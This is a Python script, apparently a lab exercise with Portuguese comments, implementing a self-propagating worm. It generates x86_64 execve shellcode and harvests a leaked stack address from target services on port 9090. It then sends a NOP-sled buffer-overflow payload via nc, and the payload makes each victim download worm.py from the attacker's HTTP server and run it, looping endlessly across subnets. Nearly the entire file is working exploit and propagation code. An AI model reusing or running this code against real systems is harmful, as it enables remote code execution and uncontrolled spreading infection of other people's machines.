#!/usr/bin/env python3
import os
import re
import time
import socket
import subprocess


def create_hex_command(command = b"echo 'true' > infectado.txt"):
    comando_alinhado = command + b"\x00"
    while len(comando_alinhado) % 8 != 0:
        comando_alinhado += b"\x00"
    # Constrói o shellcode dinamicamente invertendo o comando para o PUSH (Stack cresce para baixo)
    shellcode_dinamico = b""

    # 1. Empilha o comando em blocos de 8 bytes (x86_64)
    for i in range(len(comando_alinhado) - 8, -1, -8):
        bloco = comando_alinhado[i:i+8]
        shellcode_dinamico += b"\x48\xb8" + bloco  # mov rax, bloco_de_8_bytes
        shellcode_dinamico += b"\x50"              # push rax

    shellcode_dinamico += b"\x48\x89\xe2"          # mov rdx, rsp (rdx aponta para o comando)

    # 2. Empilha a flag "-c"
    shellcode_dinamico += (
        b"\x48\xb8\x2d\x63\x00\x00\x00\x00\x00\x00"  # mov rax, 0x632d ("-c\x00...")
        b"\x50"                                      # push rax
        b"\x48\x89\xe6"                              # mov rsi, rsp (rsi aponta para "-c")
    )

    # 3. Empilha o executável "/bin/sh"
    shellcode_dinamico += (
        b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rax, 0x0068732f6e69622f ("/bin/sh\x00")
        b"\x50"                                      # push rax
        b"\x48\x89\xe7"                              # mov rdi, rsp (rdi aponta para "/bin/sh")
    )

    # 4. Constrói o array argv na pilha [ /bin/sh, -c, comando, NULL ]
    shellcode_dinamico += (
        b"\x48\x31\xc0"  # xor rax, rax
        b"\x50"          # push rax (NULL terminator do array)
        b"\x52"          # push rdx (ponteiro para o comando)
        b"\x56"          # push rsi (ponteiro para "-c")
        b"\x57"          # push rdi (ponteiro para "/bin/sh")
        b"\x48\x89\xe6"  # mov rsi, rsp (rsi agora é o argv[])
        b"\x48\x31\xd2"  # xor rdx, rdx (envp = NULL)
        b"\xb0\x3b"      # mov al, 59 (syscall execve)
        b"\x0f\x05"      # syscall
    )
    print(f"Shellcode pronto ({len(shellcode_dinamico)} bytes):")
    print(shellcode_dinamico)
    return shellcode_dinamico


def getNextTarget():
    """Gera uma lista com todos os possíveis IPs dentro das sub-redes (172.28.1.10 a 172.28.5.14)."""
    targets = [
        f"172.28.{subnet}.{host}"
        for subnet in range(1, 6)
        for host in range(10, 15)
    ]

    index = getattr(getNextTarget, "_index", 0)
    target = targets[index]
    getNextTarget._index = (index + 1) % len(targets)
    return target


def get_leaked_address(targetIP, port=9090):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((targetIP, port))

        # Envia 1 byte — aciona o printf do Info Leak sem transbordar o buffer[50]
        s.sendall(b"A")

        response = b""
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        s.close()

        # Parseia o endereço do formato: "[INFO LEAK] O endereco real do buffer eh: 0x7fff..."
        match = re.search(rb'0x([0-9a-f]+)', response)
        if match:
            leaked = int(match.group(1), 16)
            print(f"[+] Info Leak capturado: {hex(leaked)}")
            return leaked
        else:
            print(f"[-] Resposta recebida mas endereço não encontrado: {response}")

    except Exception as e:
        print(f"[-] Erro ao capturar Info Leak de {targetIP}: {e}")

    return None


def get_attacker_ip(targetIP):
    """
    Retorna o IP do atacante baseado na sub-rede da vítima.
    Como o atacante está conectado a todas as 5 sub-redes, usa o IP
    correspondente à sub-rede da vítima para comunicação direta.
    """
    target_subnet = targetIP.split('.')[2]
    return f"172.28.{target_subnet}.100"


def getBadfile(n_line, malicious_code, leaked_addr=None):
    # Preenche o buffer com instruções NOP (0x90) -> pula pra próxima operação
    content = bytearray(0x90 for i in range(500))

    shellcode = create_hex_command(malicious_code)
    # ===================================================================
    start = max(0, min(500 - len(shellcode), 200))
    content[start:start + len(shellcode)] = shellcode

    # Confirmado via GDB: offset = 72 (RBP em 64 + 8 bytes para return address)
    offset = 72
    L = 8  # 8 bytes para endereço em x86_64

    # Endereço de retorno: aponta para dentro do NOP sled (antes do shellcode).
    if leaked_addr is not None:
        ret = leaked_addr + start  # usa o endereço real vazado + posição do shellcode
        print(f"[+] ret = {hex(leaked_addr)} + {start} = {hex(ret)}")
    else:
        # Fallback caso o Info Leak não tenha funcionado
        ret = 0x7fffffffde80 + start
        print(f"[!] Usando ret fallback: {hex(ret)}")

    content[offset:offset + L] = (ret).to_bytes(L, byteorder="little")
    # ===================================================================

    return content


def inject(badfile, targetIP, port=9090):
    with open("badfile", "wb") as f:
        f.write(badfile)

    print(f"Lançando ataque contra {targetIP}:{port}...")

    subprocess.run(
        f"cat badfile | nc -w3 {targetIP} {port}",
        shell=True,
        timeout=10
    )


def main():
    print("=" * 50)
    print("O worm chegou neste host! ^_^")
    print("=" * 50)

    targetIP = getNextTarget()
    print(f"Alvo selecionado: {targetIP}")

    # Descobre dinamicamente o IP deste container (o atacante)
    attacker_ip = get_attacker_ip(targetIP)
    print(f"[*] IP do atacante: {attacker_ip}")

    # Sobe um servidor HTTP em background para servir o worm.py
    worm_path = os.path.abspath(__file__)
    worm_dir = os.path.dirname(worm_path)
    print(f"Servindo {worm_path} na porta 8080...")
    server = subprocess.Popen(
        f"cd {worm_dir} && python3 -m http.server 8080",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(0.5)

    #Captura o Info Leak da vítima via conexão de sondagem
    leaked_addr = get_leaked_address(targetIP)
    time.sleep(1)  # Aguarda o servidor da vítima reiniciar após a sondagem

    # Monta o comando malicioso que a vítima vai executar
    malicious_cmd = (
        f"echo true>infectado.txt&&"
        f"python3 -c\"import urllib.request as u;u.urlretrieve('http://{attacker_ip}:8080/worm.py','/tmp/w')\"&&"
        f"chmod +x /tmp/w&&python3 /tmp/w&"
    ).encode()
    print(f"Comando malicioso: {malicious_cmd.decode()}")

    # Gera o payload com o endereço de retorno correto
    badfile = getBadfile(None, malicious_cmd, leaked_addr)

    # Injeta o payload na vítima via Buffer Overflow
    inject(badfile, targetIP)

    # Fecha o servidor após o envio
    try:
        server.terminate()
        server.wait(timeout=3)
        print("Servidor encerrado.")
    except Exception as e:
        print(f"Erro ao encerrar servidor: {e}")

    print("Ataque concluído com sucesso! :D")


if __name__ == "__main__":
    while True:
        main()
